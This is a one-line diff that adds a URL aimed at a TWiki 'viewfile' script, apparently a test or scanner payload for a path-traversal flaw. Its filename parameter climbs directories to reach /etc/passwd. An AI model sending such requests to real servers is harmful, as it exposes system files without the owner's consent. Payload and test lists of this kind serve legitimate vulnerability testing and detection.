@@ -1,0 +1,1 @@
+http://example.com/bin/viewfile/TWiki/TWikiDocGraphics?rev=1;filename=../../../../../etc/passwd
